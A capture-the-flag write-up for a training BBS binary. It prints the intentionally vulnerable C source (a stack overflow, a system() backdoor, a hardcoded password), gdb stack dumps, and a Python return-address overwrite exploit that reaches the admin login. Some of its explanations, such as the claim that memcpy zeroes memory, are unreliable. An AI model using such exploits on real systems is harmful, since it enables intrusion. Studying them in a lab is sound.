# Memory Corruption - Level 2

This the second level in the Memory Corruption challenges and comes with increased difficulty.

## Mission - Lett BBS

"Turns out, all the really elite hackers still use old-school bulletin board systems to stay in touch and trade warez. We've stolen the source code and binaries for one of the most popular underground BBS systems. Now we need you to get us a shell!"

## Static Analysis

From the mission statement we get two important pieces of information: 
- The objective is to obtain a shell
- We have the source code in `C` and the binary to reverse


```c
// gcc -g -no-pie -fno-stack-protector -I ../includes -o 03_level_3 03_level_3.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// Hidden for simplicity
#include "wargames.h"
#include "visualize.h"

//
// Globals
//

int g_is_admin = 0;
int g_num_posts = 0;
char g_server_name[32] = {};

typedef struct post {
    char title[32];
    char body[128];
} Post;

Post g_posts[10] = {};

//
// Admin Code
//

void backdoor(int code, char* data)
{
    if (code == 1)
        system(data);
    if (code == 2)
        g_is_admin = 1;
    if (code == 3)
        exit(2);
}

void login_as_admin()
{
    char password[32] = {};

    puts("+------=[ " CGREEN "ADMIN LOGIN" CRESET " ]=------+");
    puts("| " CMAGENTA "Enter password to continue:" CRESET " |");
    puts("+-----------------------------+");

	// Wait for the user to enter the admin password
    fgets(password, sizeof(password), stdin);
	password[strcspn(password, "\n")] = 0;

    // Elevate the user to admin if they know the master password
    if (!strcmp(password, "l0ln0onewillguessth1s"))
    {
        g_is_admin = 1;
        puts("+---------------------------------------+");
        puts("| " CGREEN "Profile Status Upgraded To" CRESET " [10] Admin |");
        puts("+---------------------------------------+");
        press_enter();
        serve_bbs();
    }

    puts("> " CRED "INVALID PASSWORD" CRESET);
    exit(1);
}

void configure_server()
{
    puts("+---=[ " CGREEN "CONFIGURATION" CRESET " ]=---+");
    puts("| [1] Set server name     |");
    puts("| [2] Shutdown server     |");
    puts("| [3] Log out of admin    |");
    puts("+-------------------------+");

    // Prompt the user to pick a menu action
    printf("Enter choice: ");
    int choice = get_number();

    // Execute the user specified menu action
    if (choice == 1)
    {
        printf("Enter new server name: ");
        fgets(g_server_name, sizeof(g_server_name), stdin);
    }
    else if (choice == 2)
    {
        puts("Server shutting down...");
        sleep(3);
        exit(0);
    }
    else if (choice == 3)
    {
        g_is_admin = 0;
    }
    else
    {
        puts(CRED"Unknown command!"CRESET);
    }
}

//
// BBS Code
//

void create_post()
{
    if (g_num_posts >= 10)
    {
        puts("+-------=[ " CGREEN "Create Post" CRESET " ]=-------+");
        puts("| " CRED "You have made too many posts!" CRESET " |");
        puts("+-------------------------------+");
        press_enter();
        return;
    }

    // Prompt the user to enter a post title
    puts("+-------=[ " CGREEN "Create Post" CRESET " ]=-------+");
    puts("| Enter post title:             |");
    fgets(g_posts[g_num_posts].title, 32, stdin);

    // Strip newline from end of title
    unsigned int index = strcspn(g_posts[g_num_posts].title, "\n");
    g_posts[g_num_posts].title[index] = 0;

    // Prompt the user to enter text content for their post
    puts("| Enter post contents:          |");
    fgets(g_posts[g_num_posts].body, 128, stdin);
    puts("+-------------------------------+\n");

    g_num_posts++;
    puts("+---------------+");
    puts("| " CGREEN "Post created!" CRESET " |");
    puts("+---------------+");
    press_enter();
}

void serve_bbs()
{
    char buffer[128] = {};

    // Initialize BBS globals
    strcpy(g_server_name, "/\\ LEET BBS /\\\n");

    while (1)
    {
        puts("+-----=[ " CCYAN "MENU" CRESET " ]=-----+");
        puts("| " CYELLOW "Actions" CRESET "            |");
        puts("|  '-[1] " CGREEN "Create post" CRESET " |");
        puts("|  '-[2] " CRED "Exit" CRESET "        |");
        puts("| " CYELLOW "Current Posts" CRESET "      v");
        for (int i = 0; i < g_num_posts; i++) {
            printf("|  '-[%d] %s\n", i+3, g_posts[i].title);
        }
        puts("+--------------------^");

        // Prompt the user to pick a menu action
        printf("Enter choice: ");
        unsigned int choice = get_number();

        // Admin-only option (Hidden)
        if (choice == 0)
        {
            if (g_is_admin)
            {
                configure_server();
            }
            else
            {
                puts("\n\n"CRED"!! XXX ERROR XXX !!"CRESET);
                puts("[ Only an admin can configure the server ]");
                press_enter();
            }
        }

        // Create a new post
        else if (choice == 1)
        {
            create_post();
        }

        // Sign-off the BBS
        else if (choice == 2)
        {
            puts("Exiting!");
            break;
        }

        // View a selected post
        else if (choice <= g_num_posts+2)
        {
            int num = choice-3;

			// Build the stylized message title
            strcpy(buffer, "\n=======] ");
            strcat(buffer, g_posts[num].title);
            strcat(buffer, " [=======\n");

            // Append the post body/content after the post title
            memcpy(buffer+strlen(buffer), g_posts[num].body, 128);

            // Print the stylized post
            puts(buffer);
			press_enter();
        }

        // Unknown menu selection...
        else
        {
        	puts(CRED"Unknown command!"CRESET);
			press_enter();
        }
    }

    printf("Thank you for visiting ");
    write(1, g_server_name, strlen(g_server_name));
}

void main()
{
	init_wargame();

    printf("------------------------------------------------------------\n");
    printf("--[ Stack Smashing, Level #2 - LEET BBS                     \n");
    printf("------------------------------------------------------------\n");
    serve_bbs();
}

```

There's a lot of code in this single source file, so I won't go over each part. If we look at the main function, we can get an idea of what the program does. In `main`, the banner is printed, then the `serve_bbs` function is called. That's as far as main goes. 


If we look at `serve_bbs` we can see there's a lot more happening:

```c
void serve_bbs()
{
    char buffer[128] = {};

    // Initialize BBS globals
    strcpy(g_server_name, "/\\ LEET BBS /\\\n");

    while (1)
    {
        puts("+-----=[ " CCYAN "MENU" CRESET " ]=-----+");
        puts("| " CYELLOW "Actions" CRESET "            |");
        puts("|  '-[1] " CGREEN "Create post" CRESET " |");
        puts("|  '-[2] " CRED "Exit" CRESET "        |");
        puts("| " CYELLOW "Current Posts" CRESET "      v");
        for (int i = 0; i < g_num_posts; i++) {
            printf("|  '-[%d] %s\n", i+3, g_posts[i].title);
        }
        puts("+--------------------^");

        // Prompt the user to pick a menu action
        printf("Enter choice: ");
        unsigned int choice = get_number();

        // Admin-only option (Hidden)
        if (choice == 0)
        {
            if (g_is_admin)
            {
                configure_server();
            }
            else
            {
                puts("\n\n"CRED"!! XXX ERROR XXX !!"CRESET);
                puts("[ Only an admin can configure the server ]");
                press_enter();
            }
        }

        // Create a new post
        else if (choice == 1)
        {
            create_post();
        }

        // Sign-off the BBS
        else if (choice == 2)
        {
            puts("Exiting!");
            break;
        }

        // View a selected post
        else if (choice <= g_num_posts+2)
        {
            int num = choice-3;

			// Build the stylized message title
            strcpy(buffer, "\n=======] ");
            strcat(buffer, g_posts[num].title);
            strcat(buffer, " [=======\n");

            // Append the post body/content after the post title
            memcpy(buffer+strlen(buffer), g_posts[num].body, 128);

            // Print the stylized post
            puts(buffer);
			press_enter();
        }

        // Unknown menu selection...
        else
        {
        	puts(CRED"Unknown command!"CRESET);
			press_enter();
        }
    }

    printf("Thank you for visiting ");
    write(1, g_server_name, strlen(g_server_name));
}
```

The code above does the following:

- Initialize a 128 byte buffer to 0
- Copy the string "/\\ LEET BBS /\\\n" to the g_server_name variable
- Create a while loop letting the user pick one of 3 options
    - Option 1: Create a post (calls the `create_post` function)
    - Option 2: Exit the program
    - Option 0: If `g_is_admin` is true, call the `configure_server` function (allows user to configure admin settings)
- In the while loop you can also view posts by entering the numerical post number as an option, however this number choice must be less than the total number of posts + 2


## Finding the Bug

Now we have an idea of what will happen when we run the program, we can start analysing in more detail to find the bug. The strategy here is to look at all the areas where we can send input to the program, then see if the user input sinks down to any dangerous functions. 


The first place we can enter input is when we are presented with a choice: 

```c
// Prompt the user to pick a menu action 
printf("Enter choice: ");
unsigned int choice = get_number();
```
Our choice will go into the `choice` variable which is an unsigned int type. If you follow the function calls, this basically ends up in a scanf wrapper that ensures we only enter a number. We can move on from here as there is no issue with this. 


Next, we take a look at what happens when we view a post: 

```c
        // View a selected post
        else if (choice <= g_num_posts+2)
        {
            int num = choice-3;

			// Build the stylized message title
            strcpy(buffer, "\n=======] ");
            strcat(buffer, g_posts[num].title);
            strcat(buffer, " [=======\n");

            // Append the post body/content after the post title
            memcpy(buffer+strlen(buffer), g_posts[num].body, 128);

            // Print the stylized post
            puts(buffer);
			press_enter();
        }
```
The 128 byte buffer (char array) is used to save the banner string and the title of a post that is created. The body of the post is then appended to the buffer immediately after the post title. The key line to note here is: 

```c
memcpy(buffer+strlen(buffer), g_posts[num].body, 128);
```
This code will move the buffer array position to the end of wherever the title text is, then copy into the buffer the body of the post with a maximum size of 128 bytes. This is where we start to find a problem :smirk:


The buffer can only hold 128 bytes, so if the offset of the buffer is moved from index 0, for example it is moved to index 32, there would only be 96 bytes (minus 1 for null terminator) avaiable before the buffer overflow. Since the `memcpy` function is copying `g_posts[num].body` with an allowed size of 128 bytes, if the user input is 96 bytes or more, the 128 byte buffer will overflow. 


To test this out we can run the binary in the debugger, then inspect the stack before and after the call to `memcpy`.

We place a breakpoint on the call to memcpy in the serve_bbs function:
```gdb
break *0x4010f7
```
Next, we run the binary and choose to create a post.

```gdb
wdb> start
Started '03_level_2'
Breakpoint 1: 0x40115f, main+0
wdb> contin
------------------------------------------------------------
--[ Stack Smashing, Level #2 - LEET BBS
------------------------------------------------------------
+-----=[ MENU ]=-----+
| Actions            |
|  '-[1] Create post |
|  '-[2] Exit        |
| Current Posts      v
+--------------------^
Enter choice:
>>

```

Before we send any input, we should think about how the stack is likely layed out and what sizes are already in use. Recall that in the x86-64 calling convention, the first two items placed before the beginning of the stack is the return address and the old rbp. This will take up 16 bytes to begin with. If we look at the setup of the stack in the disassembly for `serve_bbs`, we can see how many bytes are allocated: 

```asm
0x400ebc:  push    rbp
0x400ebd:  mov     rbp, rsp
0x400ec0:  push    rbx
0x400ec1:  sub     rsp, 0x98
0x400ec8:  lea     rdx, [rbp-0xa0]
```
As mentioned above, first: 
- rbp is pushed to the stack before our frame pointer begins. 
- Next the `mov rbp, rsp` instruction moved the stack pointer address into rbp to begin the stack frame for `serve_bbs`. 
- Then, `push rbx` will push another 8 byte value to the stack.
- Finally, `sub rsp,  0x98` will subtract another 152 bytes from the current location of the stack pointer (rbp-0x8). 

This means the stack is 160 bytes in size (0xa0). The next thing we need to consider is the size of the post title buffer `32 bytes` and the size of the stylized message string `20 bytes`. Together this presents 52 bytes used up in the buffer, which we substract from 160, leaving `108 bytes`. If we send 30 'A's (accounting for a newline added by fgets and \0 null terminating character), this will add up to 32 bytes for the title. We can then send 108 'B's, which should take us to the beginning of the stack just before the saved `rbp` and return address. 


```gdb
Enter choice:
>> 1
+-------=[ Create Post ]=-------+
| Enter post title:             |
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
| Enter post contents:          |
>> BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBB
+-------------------------------+

+---------------+
| Post created! |
+---------------+
Press enter to continue...
```

When we press enter to continue, we are back at the menu prompt. Recall that the `memcpy` operation happens when a post is viewed, so we will need to view a post to trigger the bug. Enter `3` as the choice then when our breakpoint is hit, we inspect the stack before the memcpy operation.

```gdb
Enter choice: 
>> 3
Breakpoint 0: 0x4010f7, serve_bbs+571
wdb> x/22gx $rsp
0x7fffffffed20: 0x3d3d3d3d3d3d3d0a    0x414141414141205d
0x7fffffffed30: 0x4141414141414141    0x4141414141414141
0x7fffffffed40: 0x4141414141414141    0x3d3d3d3d3d3d5b20
0x7fffffffed50: 0x0000000000000a3d    0x0000000000000000
0x7fffffffed60: 0x0000000000000000    0x0000000000000000
0x7fffffffed70: 0x0000000000000000    0x0000000000000000
0x7fffffffed80: 0x0000000000000000    0x0000000000000000
0x7fffffffed90: 0x0000000000000000    0x0000000000000000
0x7fffffffeda0: 0x0000000000401738    0x0000000100000003
0x7fffffffedb0: 0x0000000000000000    0x0000000000000000
0x7fffffffedc0: 0x00007fffffffedd0    0x0000000000401195
```
From the output, we already see the 'A's (0x41) that represent our title, followed by the string characters for the end of the stylized message title. This is followed space reserved for the remaining buffer allocation, until `0x7fffffffed98`. The old rbp address pushed to the stack is in `0x7fffffffedc0` and has the value `0x00007fffffffedd0`. Lastly, the return address is in `0x7fffffffedc8` and has the value `0x0000000000401195`


We'll type `ni` to allow the memcpy to complete, then review the stack again:

```gdb
wdb> ni
0x4010fc in serve_bbs ()
wdb> x/22gx $rsp
0x7fffffffed20: 0x3d3d3d3d3d3d3d0a    0x414141414141205d
0x7fffffffed30: 0x4141414141414141    0x4141414141414141
0x7fffffffed40: 0x4141414141414141    0x3d3d3d3d3d3d5b20
0x7fffffffed50: 0x4242424242420a3d    0x4242424242424242
0x7fffffffed60: 0x4242424242424242    0x4242424242424242
0x7fffffffed70: 0x4242424242424242    0x4242424242424242
0x7fffffffed80: 0x4242424242424242    0x4242424242424242
0x7fffffffed90: 0x4242424242424242    0x4242424242424242
0x7fffffffeda0: 0x4242424242424242    0x4242424242424242
0x7fffffffedb0: 0x4242424242424242    0x000a424242424242
0x7fffffffedc0: 0x0000000000000000    0x0000000000000000
```

As expected, the input has filled out the buffer and overflowed, stopping just before the old rbp and return address. When memcpy operates, it zeros out the buffer it is being copied into, so the `0x7fffffffedc0` and `0x7fffffffedc8` memory locations appear to hold 0's instead of the addresses. 
Now we know where the return address is and how many bytes we need to send, we can start to redirect program execution by replacing the return address of the `server_bbs` function to one of our choosing, `login_as_admin` (0x400bce).



### Python script to login as admin:

```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil('Enter choice')
p.sendline('1')
#p.readuntil('Enter post title:')
p.sendline('A' * 30)
#p.readuntil('Enter post contents:')
p.sendline('B' * 110 + 'C' * 7 + '\0' + '\xce\x0b\x40\x00\x00\x00\x00\x00' )


p.interactive()
```
After sending this, we can check the stack and verify we have overwritten the address:

```gdb
wdb> ni
0x4010fc in serve_bbs ()
wdb> x/22gx $rsp
0x7fffffffed20: 0x3d3d3d3d3d3d3d0a    0x414141414141205d
0x7fffffffed30: 0x4141414141414141    0x4141414141414141
0x7fffffffed40: 0x4141414141414141    0x3d3d3d3d3d3d5b20
0x7fffffffed50: 0x4242424242420a3d    0x4242424242424242
0x7fffffffed60: 0x4242424242424242    0x4242424242424242
0x7fffffffed70: 0x4242424242424242    0x4242424242424242
0x7fffffffed80: 0x4242424242424242    0x4242424242424242
0x7fffffffed90: 0x4242424242424242    0x4242424242424242
0x7fffffffeda0: 0x4242424242424242    0x4242424242424242
0x7fffffffedb0: 0x4242424242424242    0x4242424242424242
0x7fffffffedc0: 0x0043434343434343    0x0000000000400bce
```
Once we press continue, we need to exit the program to cause the crash, but this time we get redirected to the admin login prompt:

```gdb
Enter choice:
>> 2
Exiting!
Thank you for visiting /\ LEET BBS /\
+------=[ ADMIN LOGIN ]=------+
| Enter password to continue: |
+-----------------------------+
>> l0ln0onewillguessth1s
+---------------------------------------+
| Profile Status Upgraded To [10] Admin |
+---------------------------------------+
Press enter to continue...
```


